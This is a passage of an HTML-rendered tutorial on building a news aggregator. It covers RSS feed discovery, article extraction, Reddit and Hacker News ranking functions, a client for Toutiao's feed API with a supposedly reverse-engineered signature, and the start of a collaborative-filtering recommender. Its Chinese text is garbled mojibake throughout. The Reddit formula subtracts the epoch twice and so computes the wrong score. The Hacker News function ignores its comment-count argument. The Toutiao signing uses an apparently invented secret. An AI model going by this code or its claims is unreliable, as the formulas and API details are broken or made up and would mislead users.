<span class="k">for</span> <span class="n">article</span> <span class="ow">in</span> <span class="n">latest</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[</span><span class="si">{</span><span class="n">article</span><span class="p">[</span><span class="mi">5</span><span class="p">]</span><span class="si">}</span><span class="s2">] </span><span class="si">{</span><span class="n">article</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>  <span class="c1"># [source] title</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  </span><span class="si">{</span><span class="n">article</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>  <span class="c1"># link</span>
    <span class="nb">print</span><span class="p">()</span>
</code></pre>
      </div>

      <h3 id="é«˜çº§åŠŸèƒ½">é«˜çº§åŠŸèƒ½</h3>

      <h4 id="1-feed-è‡ªåŠ¨å‘ç°">1. Feed è‡ªåŠ¨å‘ç°</h4>

      <p>æŸäº›ç½‘ç«™æ²¡æœ‰æ˜æ˜¾çš„ RSS é“¾æ¥ï¼Œéœ€è¦è‡ªåŠ¨å‘ç°:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">bs4</span><span class="w"> </span><span class="kn">import</span> <span class="n">BeautifulSoup</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">urllib.parse</span><span class="w"> </span><span class="kn">import</span> <span class="n">urljoin</span>

<span class="k">def</span><span class="w"> </span><span class="nf">discover_feeds</span><span class="p">(</span><span class="n">url</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;è‡ªåŠ¨å‘ç°ç½‘ç«™çš„ RSS/Atom feeds&quot;&quot;&quot;</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="n">response</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
        <span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">response</span><span class="o">.</span><span class="n">text</span><span class="p">,</span> <span class="s1">&#39;html.parser&#39;</span><span class="p">)</span>

        <span class="n">feeds</span> <span class="o">=</span> <span class="p">[]</span>

        <span class="c1"># æŸ¥æ‰¾ &lt;link&gt; æ ‡ç­¾</span>
        <span class="k">for</span> <span class="n">link</span> <span class="ow">in</span> <span class="n">soup</span><span class="o">.</span><span class="n">find_all</span><span class="p">(</span><span class="s1">&#39;link&#39;</span><span class="p">,</span> <span class="nb">type</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;application/rss+xml&#39;</span><span class="p">,</span> <span class="s1">&#39;application/atom+xml&#39;</span><span class="p">]):</span>
            <span class="n">feed_url</span> <span class="o">=</span> <span class="n">urljoin</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">link</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;href&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">))</span>
            <span class="n">feed_title</span> <span class="o">=</span> <span class="n">link</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;title&#39;</span><span class="p">,</span> <span class="s1">&#39;Untitled Feed&#39;</span><span class="p">)</span>

            <span class="n">feeds</span><span class="o">.</span><span class="n">append</span><span class="p">({</span>
                <span class="s1">&#39;url&#39;</span><span class="p">:</span> <span class="n">feed_url</span><span class="p">,</span>
                <span class="s1">&#39;title&#39;</span><span class="p">:</span> <span class="n">feed_title</span><span class="p">,</span>
                <span class="s1">&#39;type&#39;</span><span class="p">:</span> <span class="n">link</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;type&#39;</span><span class="p">)</span>
            <span class="p">})</span>

        <span class="c1"># å¸¸è§çš„ feed è·¯å¾„</span>
        <span class="n">common_paths</span> <span class="o">=</span> <span class="p">[</span><span class="s1">&#39;/feed&#39;</span><span class="p">,</span> <span class="s1">&#39;/rss&#39;</span><span class="p">,</span> <span class="s1">&#39;/atom.xml&#39;</span><span class="p">,</span> <span class="s1">&#39;/rss.xml&#39;</span><span class="p">,</span> <span class="s1">&#39;/feed.xml&#39;</span><span class="p">]</span>

        <span class="k">for</span> <span class="n">path</span> <span class="ow">in</span> <span class="n">common_paths</span><span class="p">:</span>
            <span class="n">test_url</span> <span class="o">=</span> <span class="n">urljoin</span><span class="p">(</span><span class="n">url</span><span class="p">,</span> <span class="n">path</span><span class="p">)</span>
            <span class="k">try</span><span class="p">:</span>
                <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">head</span><span class="p">(</span><span class="n">test_url</span><span class="p">,</span> <span class="n">timeout</span><span class="o">=</span><span class="mi">3</span><span class="p">)</span>
                <span class="k">if</span> <span class="n">r</span><span class="o">.</span><span class="n">status_code</span> <span class="o">==</span> <span class="mi">200</span><span class="p">:</span>
                    <span class="n">feeds</span><span class="o">.</span><span class="n">append</span><span class="p">({</span>
                        <span class="s1">&#39;url&#39;</span><span class="p">:</span> <span class="n">test_url</span><span class="p">,</span>
                        <span class="s1">&#39;title&#39;</span><span class="p">:</span> <span class="sa">f</span><span class="s1">&#39;Feed at </span><span class="si">{</span><span class="n">path</span><span class="si">}</span><span class="s1">&#39;</span><span class="p">,</span>
                        <span class="s1">&#39;type&#39;</span><span class="p">:</span> <span class="s1">&#39;application/rss+xml&#39;</span>
                    <span class="p">})</span>
            <span class="k">except</span><span class="p">:</span>
                <span class="k">continue</span>

        <span class="k">return</span> <span class="n">feeds</span>

    <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
        <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Error discovering feeds: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
        <span class="k">return</span> <span class="p">[]</span>

<span class="c1"># ä½¿ç”¨ç¤ºä¾‹</span>
<span class="n">feeds</span> <span class="o">=</span> <span class="n">discover_feeds</span><span class="p">(</span><span class="s1">&#39;https://blog.example.com&#39;</span><span class="p">)</span>
<span class="k">for</span> <span class="n">feed</span> <span class="ow">in</span> <span class="n">feeds</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">feed</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">feed</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <h4 id="2-full-content-extraction">2. Full Content Extraction</h4>

      <p>RSS feed é€šå¸¸åªåŒ…å«æ‘˜è¦ï¼Œéœ€è¦æå–å®Œæ•´å†…å®¹:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">newspaper</span><span class="w"> </span><span class="kn">import</span> <span class="n">Article</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">re</span>

<span class="k">class</span><span class="w"> </span><span class="nc">FullContentExtractor</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="k">pass</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">extract_article</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">url</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æå–å®Œæ•´æ–‡ç« å†…å®¹&quot;&quot;&quot;</span>
        <span class="k">try</span><span class="p">:</span>
            <span class="n">article</span> <span class="o">=</span> <span class="n">Article</span><span class="p">(</span><span class="n">url</span><span class="p">)</span>
            <span class="n">article</span><span class="o">.</span><span class="n">download</span><span class="p">()</span>
            <span class="n">article</span><span class="o">.</span><span class="n">parse</span><span class="p">()</span>

            <span class="c1"># NLP å¤„ç†ï¼ˆå¯é€‰ï¼‰</span>
            <span class="n">article</span><span class="o">.</span><span class="n">nlp</span><span class="p">()</span>

            <span class="k">return</span> <span class="p">{</span>
                <span class="s1">&#39;title&#39;</span><span class="p">:</span> <span class="n">article</span><span class="o">.</span><span class="n">title</span><span class="p">,</span>
                <span class="s1">&#39;authors&#39;</span><span class="p">:</span> <span class="n">article</span><span class="o">.</span><span class="n">authors</span><span class="p">,</span>
                <span class="s1">&#39;publish_date&#39;</span><span class="p">:</span> <span class="n">article</span><span class="o">.</span><span class="n">publish_date</span><span class="p">,</span>
                <span class="s1">&#39;text&#39;</span><span class="p">:</span> <span class="n">article</span><span class="o">.</span><span class="n">text</span><span class="p">,</span>
                <span class="s1">&#39;top_image&#39;</span><span class="p">:</span> <span class="n">article</span><span class="o">.</span><span class="n">top_image</span><span class="p">,</span>
                <span class="s1">&#39;videos&#39;</span><span class="p">:</span> <span class="n">article</span><span class="o">.</span><span class="n">movies</span><span class="p">,</span>
                <span class="s1">&#39;keywords&#39;</span><span class="p">:</span> <span class="n">article</span><span class="o">.</span><span class="n">keywords</span><span class="p">,</span>
                <span class="s1">&#39;summary&#39;</span><span class="p">:</span> <span class="n">article</span><span class="o">.</span><span class="n">summary</span>
            <span class="p">}</span>

        <span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
            <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Error extracting </span><span class="si">{</span><span class="n">url</span><span class="si">}</span><span class="s2">: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
            <span class="k">return</span> <span class="kc">None</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">clean_text</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">text</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;æ¸…ç†æ–‡æœ¬&quot;&quot;&quot;</span>
        <span class="c1"># ç§»é™¤å¤šä½™ç©ºè¡Œ</span>
        <span class="n">text</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="sa">r</span><span class="s1">&#39;\n{3,}&#39;</span><span class="p">,</span> <span class="s1">&#39;</span><span class="se">\n\n</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">text</span><span class="p">)</span>

        <span class="c1"># ç§»é™¤å¹¿å‘Šæ ‡è®°</span>
        <span class="n">ad_patterns</span> <span class="o">=</span> <span class="p">[</span>
            <span class="sa">r</span><span class="s1">&#39;\[å¹¿å‘Š\].*?\n&#39;</span><span class="p">,</span>
            <span class="sa">r</span><span class="s1">&#39;Advertisement.*?\n&#39;</span><span class="p">,</span>
            <span class="sa">r</span><span class="s1">&#39;Sponsored.*?\n&#39;</span>
        <span class="p">]</span>

        <span class="k">for</span> <span class="n">pattern</span> <span class="ow">in</span> <span class="n">ad_patterns</span><span class="p">:</span>
            <span class="n">text</span> <span class="o">=</span> <span class="n">re</span><span class="o">.</span><span class="n">sub</span><span class="p">(</span><span class="n">pattern</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="n">text</span><span class="p">,</span> <span class="n">flags</span><span class="o">=</span><span class="n">re</span><span class="o">.</span><span class="n">IGNORECASE</span><span class="p">)</span>

        <span class="k">return</span> <span class="n">text</span><span class="o">.</span><span class="n">strip</span><span class="p">()</span>

<span class="c1"># ä½¿ç”¨ç¤ºä¾‹</span>
<span class="n">extractor</span> <span class="o">=</span> <span class="n">FullContentExtractor</span><span class="p">()</span>
<span class="n">content</span> <span class="o">=</span> <span class="n">extractor</span><span class="o">.</span><span class="n">extract_article</span><span class="p">(</span><span class="s1">&#39;https://news.example.com/article/123&#39;</span><span class="p">)</span>

<span class="k">if</span> <span class="n">content</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Title: </span><span class="si">{</span><span class="n">content</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Summary: </span><span class="si">{</span><span class="n">content</span><span class="p">[</span><span class="s1">&#39;summary&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <hr />

      <h2 id="æ¡ˆä¾‹-2-ä¸ªæ€§åŒ–æ¨èç®—æ³•é€†å‘">æ¡ˆä¾‹ 2: ä¸ªæ€§åŒ–æ¨èç®—æ³•é€†å‘</h2>

      <h3 id="èƒŒæ™¯-2">èƒŒæ™¯</h3>

      <p>æ–°é—»èšåˆå¹³å°ï¼ˆå¦‚ä»Šæ—¥å¤´æ¡ã€Redditï¼‰ä½¿ç”¨æ¨èç®—æ³•ä¸ªæ€§åŒ–å†…å®¹ã€‚é€†å‘è¿™äº›ç®—æ³•å¯ä»¥ç†è§£æ¨èæœºåˆ¶ã€‚</p>

      <h3 id="reddit-æ’åç®—æ³•">Reddit æ’åç®—æ³•</h3>

      <p>Reddit ä½¿ç”¨ &#8220;Hot&#8221; æ’åç®—æ³•:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">datetime</span><span class="w"> </span><span class="kn">import</span> <span class="n">datetime</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">math</span>

<span class="k">def</span><span class="w"> </span><span class="nf">reddit_hot_score</span><span class="p">(</span><span class="n">ups</span><span class="p">,</span> <span class="n">downs</span><span class="p">,</span> <span class="n">date</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">    Reddit Hot ç®—æ³•</span>
<span class="sd">    - ups: ç‚¹èµæ•°</span>
<span class="sd">    - downs: è¸©æ•°</span>
<span class="sd">    - date: å‘å¸ƒæ—¶é—´</span>
<span class="sd">    &quot;&quot;&quot;</span>
    <span class="c1"># è®¡ç®—åˆ†æ•°</span>
    <span class="n">s</span> <span class="o">=</span> <span class="n">ups</span> <span class="o">-</span> <span class="n">downs</span>

    <span class="c1"># æ’åºï¼ˆ1 è¡¨ç¤ºæ­£åˆ†ï¼Œ-1 è¡¨ç¤ºè´Ÿåˆ†ï¼Œ0 è¡¨ç¤ºä¸­æ€§ï¼‰</span>
    <span class="n">order</span> <span class="o">=</span> <span class="n">math</span><span class="o">.</span><span class="n">log</span><span class="p">(</span><span class="nb">max</span><span class="p">(</span><span class="nb">abs</span><span class="p">(</span><span class="n">s</span><span class="p">),</span> <span class="mi">1</span><span class="p">),</span> <span class="mi">10</span><span class="p">)</span>

    <span class="k">if</span> <span class="n">s</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">sign</span> <span class="o">=</span> <span class="mi">1</span>
    <span class="k">elif</span> <span class="n">s</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
        <span class="n">sign</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">sign</span> <span class="o">=</span> <span class="mi">0</span>

    <span class="c1"># æ—¶é—´è¡°å‡ï¼ˆReddit epoch: 2005-12-08 07:46:43ï¼‰</span>
    <span class="n">epoch</span> <span class="o">=</span> <span class="n">datetime</span><span class="p">(</span><span class="mi">2005</span><span class="p">,</span> <span class="mi">12</span><span class="p">,</span> <span class="mi">8</span><span class="p">,</span> <span class="mi">7</span><span class="p">,</span> <span class="mi">46</span><span class="p">,</span> <span class="mi">43</span><span class="p">)</span>
    <span class="n">seconds</span> <span class="o">=</span> <span class="p">(</span><span class="n">date</span> <span class="o">-</span> <span class="n">epoch</span><span class="p">)</span><span class="o">.</span><span class="n">total_seconds</span><span class="p">()</span> <span class="o">-</span> <span class="mi">1134028003</span>

    <span class="k">return</span> <span class="nb">round</span><span class="p">(</span><span class="n">sign</span> <span class="o">*</span> <span class="n">order</span> <span class="o">+</span> <span class="n">seconds</span> <span class="o">/</span> <span class="mi">45000</span><span class="p">,</span> <span class="mi">7</span><span class="p">)</span>

<span class="c1"># ç¤ºä¾‹</span>
<span class="n">post1_score</span> <span class="o">=</span> <span class="n">reddit_hot_score</span><span class="p">(</span>
    <span class="n">ups</span><span class="o">=</span><span class="mi">100</span><span class="p">,</span>
    <span class="n">downs</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span>
    <span class="n">date</span><span class="o">=</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span>
<span class="p">)</span>

<span class="n">post2_score</span> <span class="o">=</span> <span class="n">reddit_hot_score</span><span class="p">(</span>
    <span class="n">ups</span><span class="o">=</span><span class="mi">500</span><span class="p">,</span>
    <span class="n">downs</span><span class="o">=</span><span class="mi">50</span><span class="p">,</span>
    <span class="n">date</span><span class="o">=</span><span class="n">datetime</span><span class="o">.</span><span class="n">now</span><span class="p">()</span>
<span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Post 1 score: </span><span class="si">{</span><span class="n">post1_score</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Post 2 score: </span><span class="si">{</span><span class="n">post2_score</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="hacker-news-æ’åç®—æ³•">Hacker News æ’åç®—æ³•</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">from</span><span class="w"> </span><span class="nn">datetime</span><span class="w"> </span><span class="kn">import</span> <span class="n">datetime</span>

<span class="k">def</span><span class="w"> </span><span class="nf">hackernews_ranking</span><span class="p">(</span><span class="n">points</span><span class="p">,</span> <span class="n">num_comments</span><span class="p">,</span> <span class="n">hours_since_submission</span><span class="p">,</span> <span class="n">gravity</span><span class="o">=</span><span class="mf">1.8</span><span class="p">):</span>
<span class="w">    </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">    Hacker News æ’åç®—æ³•</span>
<span class="sd">    - points: ç‚¹æ•°ï¼ˆç‚¹èµ - è¸©ï¼‰</span>
<span class="sd">    - num_comments: è¯„è®ºæ•°</span>
<span class="sd">    - hours_since_submission: å‘å¸ƒåçš„å°æ—¶æ•°</span>
<span class="sd">    - gravity: é‡åŠ›å‚æ•°ï¼ˆé»˜è®¤ 1.8ï¼‰</span>
<span class="sd">    &quot;&quot;&quot;</span>
    <span class="k">return</span> <span class="p">(</span><span class="n">points</span> <span class="o">-</span> <span class="mi">1</span><span class="p">)</span> <span class="o">/</span> <span class="nb">pow</span><span class="p">((</span><span class="n">hours_since_submission</span> <span class="o">+</span> <span class="mi">2</span><span class="p">),</span> <span class="n">gravity</span><span class="p">)</span>

<span class="c1"># ç¤ºä¾‹</span>
<span class="n">story1_rank</span> <span class="o">=</span> <span class="n">hackernews_ranking</span><span class="p">(</span>
    <span class="n">points</span><span class="o">=</span><span class="mi">150</span><span class="p">,</span>
    <span class="n">num_comments</span><span class="o">=</span><span class="mi">30</span><span class="p">,</span>
    <span class="n">hours_since_submission</span><span class="o">=</span><span class="mi">2</span>
<span class="p">)</span>

<span class="n">story2_rank</span> <span class="o">=</span> <span class="n">hackernews_ranking</span><span class="p">(</span>
    <span class="n">points</span><span class="o">=</span><span class="mi">80</span><span class="p">,</span>
    <span class="n">num_comments</span><span class="o">=</span><span class="mi">10</span><span class="p">,</span>
    <span class="n">hours_since_submission</span><span class="o">=</span><span class="mi">6</span>
<span class="p">)</span>

<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Story 1 rank: </span><span class="si">{</span><span class="n">story1_rank</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
<span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;Story 2 rank: </span><span class="si">{</span><span class="n">story2_rank</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="ä»Šæ—¥å¤´æ¡æ¨èé€†å‘">ä»Šæ—¥å¤´æ¡æ¨èé€†å‘</h3>

      <p>é€šè¿‡æŠ“åŒ…åˆ†æï¼Œå‘ç°ä»Šæ—¥å¤´æ¡ä½¿ç”¨ä»¥ä¸‹å‚æ•°:</p>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">requests</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">hashlib</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">time</span>
<span class="kn">import</span><span class="w"> </span><span class="nn">json</span>

<span class="k">class</span><span class="w"> </span><span class="nc">ToutiaoRecommender</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">base_url</span> <span class="o">=</span> <span class="s2">&quot;https://www.toutiao.com/api/pc/feed/&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">session</span> <span class="o">=</span> <span class="n">requests</span><span class="o">.</span><span class="n">Session</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">generate_signature</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">timestamp</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">        ç”Ÿæˆç­¾å</span>
<span class="sd">        é€†å‘è‡ª Toutiao çš„ JS ä»£ç </span>
<span class="sd">        &quot;&quot;&quot;</span>
        <span class="c1"># ç®€åŒ–ç‰ˆæœ¬ï¼ˆå®é™…ç®—æ³•æ›´å¤æ‚ï¼‰</span>
        <span class="n">secret</span> <span class="o">=</span> <span class="s2">&quot;toutiao_secret_2024&quot;</span>
        <span class="n">str_to_sign</span> <span class="o">=</span> <span class="sa">f</span><span class="s2">&quot;</span><span class="si">{</span><span class="n">timestamp</span><span class="si">}</span><span class="s2">|</span><span class="si">{</span><span class="n">secret</span><span class="si">}</span><span class="s2">&quot;</span>
        <span class="k">return</span> <span class="n">hashlib</span><span class="o">.</span><span class="n">md5</span><span class="p">(</span><span class="n">str_to_sign</span><span class="o">.</span><span class="n">encode</span><span class="p">())</span><span class="o">.</span><span class="n">hexdigest</span><span class="p">()</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">get_recommendations</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">category</span><span class="o">=</span><span class="s1">&#39;news&#39;</span><span class="p">,</span> <span class="n">count</span><span class="o">=</span><span class="mi">20</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;è·å–æ¨èå†…å®¹&quot;&quot;&quot;</span>
        <span class="n">timestamp</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">time</span><span class="o">.</span><span class="n">time</span><span class="p">())</span>
        <span class="n">signature</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">generate_signature</span><span class="p">(</span><span class="n">timestamp</span><span class="p">)</span>

        <span class="n">params</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;category&#39;</span><span class="p">:</span> <span class="n">category</span><span class="p">,</span>
            <span class="s1">&#39;count&#39;</span><span class="p">:</span> <span class="n">count</span><span class="p">,</span>
            <span class="s1">&#39;min_behot_time&#39;</span><span class="p">:</span> <span class="n">timestamp</span><span class="p">,</span>
            <span class="s1">&#39;_signature&#39;</span><span class="p">:</span> <span class="n">signature</span>
        <span class="p">}</span>

        <span class="n">headers</span> <span class="o">=</span> <span class="p">{</span>
            <span class="s1">&#39;User-Agent&#39;</span><span class="p">:</span> <span class="s1">&#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36&#39;</span><span class="p">,</span>
            <span class="s1">&#39;Referer&#39;</span><span class="p">:</span> <span class="s1">&#39;https://www.toutiao.com/&#39;</span>
        <span class="p">}</span>

        <span class="n">response</span> <span class="o">=</span> <span class="bp">self</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span>
            <span class="bp">self</span><span class="o">.</span><span class="n">base_url</span><span class="p">,</span>
            <span class="n">params</span><span class="o">=</span><span class="n">params</span><span class="p">,</span>
            <span class="n">headers</span><span class="o">=</span><span class="n">headers</span>
        <span class="p">)</span>

        <span class="n">data</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">json</span><span class="p">()</span>

        <span class="n">articles</span> <span class="o">=</span> <span class="p">[]</span>
        <span class="k">for</span> <span class="n">item</span> <span class="ow">in</span> <span class="n">data</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;data&#39;</span><span class="p">,</span> <span class="p">[]):</span>
            <span class="n">article</span> <span class="o">=</span> <span class="p">{</span>
                <span class="s1">&#39;title&#39;</span><span class="p">:</span> <span class="n">item</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;title&#39;</span><span class="p">),</span>
                <span class="s1">&#39;url&#39;</span><span class="p">:</span> <span class="n">item</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;source_url&#39;</span><span class="p">),</span>
                <span class="s1">&#39;abstract&#39;</span><span class="p">:</span> <span class="n">item</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;abstract&#39;</span><span class="p">),</span>
                <span class="s1">&#39;source&#39;</span><span class="p">:</span> <span class="n">item</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;source&#39;</span><span class="p">),</span>
                <span class="s1">&#39;publish_time&#39;</span><span class="p">:</span> <span class="n">item</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;publish_time&#39;</span><span class="p">),</span>
                <span class="s1">&#39;has_video&#39;</span><span class="p">:</span> <span class="n">item</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;has_video&#39;</span><span class="p">,</span> <span class="kc">False</span><span class="p">),</span>
                <span class="s1">&#39;image_url&#39;</span><span class="p">:</span> <span class="n">item</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;image_url&#39;</span><span class="p">)</span>
            <span class="p">}</span>
            <span class="n">articles</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">article</span><span class="p">)</span>

        <span class="k">return</span> <span class="n">articles</span>

<span class="c1"># ä½¿ç”¨ç¤ºä¾‹</span>
<span class="n">recommender</span> <span class="o">=</span> <span class="n">ToutiaoRecommender</span><span class="p">()</span>
<span class="n">articles</span> <span class="o">=</span> <span class="n">recommender</span><span class="o">.</span><span class="n">get_recommendations</span><span class="p">(</span><span class="n">category</span><span class="o">=</span><span class="s1">&#39;tech&#39;</span><span class="p">,</span> <span class="n">count</span><span class="o">=</span><span class="mi">10</span><span class="p">)</span>

<span class="k">for</span> <span class="n">article</span> <span class="ow">in</span> <span class="n">articles</span><span class="p">:</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;[</span><span class="si">{</span><span class="n">article</span><span class="p">[</span><span class="s1">&#39;source&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">] </span><span class="si">{</span><span class="n">article</span><span class="p">[</span><span class="s1">&#39;title&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&quot;  </span><span class="si">{</span><span class="n">article</span><span class="p">[</span><span class="s1">&#39;url&#39;</span><span class="p">]</span><span class="si">}</span><span class="s2">&quot;</span><span class="p">)</span>
</code></pre>
      </div>

      <h3 id="ååŒè¿‡æ»¤æ¨èå®ç°">ååŒè¿‡æ»¤æ¨èå®ç°</h3>

      <div class="codehilite">
        <pre><span></span><code><span class="kn">import</span><span class="w"> </span><span class="nn">numpy</span><span class="w"> </span><span class="k">as</span><span class="w"> </span><span class="nn">np</span>
<span class="kn">from</span><span class="w"> </span><span class="nn">sklearn.metrics.pairwise</span><span class="w"> </span><span class="kn">import</span> <span class="n">cosine_similarity</span>

<span class="k">class</span><span class="w"> </span><span class="nc">CollaborativeFilteringRecommender</span><span class="p">:</span>
    <span class="k">def</span><span class="w"> </span><span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">user_item_matrix</span> <span class="o">=</span> <span class="kc">None</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">item_similarity</span> <span class="o">=</span> <span class="kc">None</span>

    <span class="k">def</span><span class="w"> </span><span class="nf">fit</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">user_item_matrix</span><span class="p">):</span>
<span class="w">        </span><span class="sd">&quot;&quot;&quot;</span>
<span class="sd">        è®­ç»ƒæ¨èæ¨¡å‹</span>
<span class="sd">        user_item_matrix: numpy array, shape (n_users, n_items)</span>
<span class="sd">        &quot;&quot;&quot;</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">user_item_matrix</span> <span class="o">=</span> <span class="n">user_item_matrix</span>

        <span class="c1"># è®¡ç®—ç‰©å“ç›¸ä¼¼åº¦ï¼ˆåŸºäºç”¨æˆ·è¡Œä¸ºï¼‰</span>
        <span class="bp">self</span><span class="o">.</span><span class="n">item_similarity</span> <span class="o">=</span> <span class="n">cosine_similarity</span><span class="p">(</span><span class="n">user_item_matrix</span><span class="o">.</span><span class="n">T</span><span class="p">)</span>

